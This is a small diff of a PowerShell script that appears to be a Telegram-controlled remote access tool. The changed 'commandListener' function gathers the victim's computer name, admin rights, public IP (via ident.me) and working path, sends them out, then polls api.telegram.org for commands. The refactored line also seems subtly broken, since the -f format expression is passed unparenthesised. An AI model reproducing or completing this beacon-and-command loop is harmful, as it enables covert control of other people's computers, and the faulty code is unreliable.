@@ -191,7 +191,11 @@ function sendMessage ($output, $message_id)
 function commandListener 
 {
     try {
-        sendMessage ("$env:COMPUTERNAME ($(checkAdminRights)) Connected with this IP: " + ((Invoke-WebRequest -Uri "https://ident.me/").Content) + " [$(Get-Location)]")
+        $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content
+        $_path  = (Get-Location).Path
+        $_user  = checkAdminRights
+        $_host  = $env:COMPUTERNAME
+        sendMessage "{0} ({1}) - IP:{2} - [{3}]" -f $_host, $_user, $_ip, $_path
         while (Invoke-RestMethod -Method Get "api.telegram.org") 
         {
             $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates
